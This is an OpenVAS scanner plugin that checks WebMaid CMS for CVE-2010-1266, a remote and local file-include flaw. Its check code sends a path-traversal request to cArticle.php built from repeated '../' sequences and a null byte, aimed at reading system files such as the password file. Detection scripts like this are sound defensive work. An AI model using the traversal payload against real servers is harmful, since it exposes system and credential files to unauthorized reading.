###############################################################################
# OpenVAS Vulnerability Test
#
# WebMaid CMS Multiple Remote and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100559");
  script_version("2019-05-14T08:13:05+0000");
  script_tag(name:"last_modification", value:"2019-05-14 08:13:05 +0000 (Tue, 14 May 2019)");
  script_tag(name:"creation_date", value:"2010-03-29 12:55:36 +0200 (Mon, 29 Mar 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-1266");
  script_bugtraq_id(38993);

  script_name("WebMaid CMS Multiple Remote and Local File Include Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38993");
  script_xref(name:"URL", value:"http://code.google.com/p/webmaidcms/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_webMAID_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("webmaid/detected");

  script_tag(name:"summary", value:"WebMaid CMS is prone to multiple remote and local file-include
  vulnerabilities because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary server-side
  script code that resides on an affected computer or in a remote location with the privileges of the
  webserver process. This may facilitate unauthorized access.");

  script_tag(name:"affected", value:"WebMaid CMS 0.2-6 Beta is vulnerable. Other versions may also
  be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("misc_func.inc");
include("host_details.inc");

port = get_http_port(default:80);

if(!dir = get_dir_from_kb(port:port, app:"webmaid"))
  exit(0);

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = string(dir,"/cArticle.php?com=../../../../../../../../../../../../../../",file,"%00");
  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(0);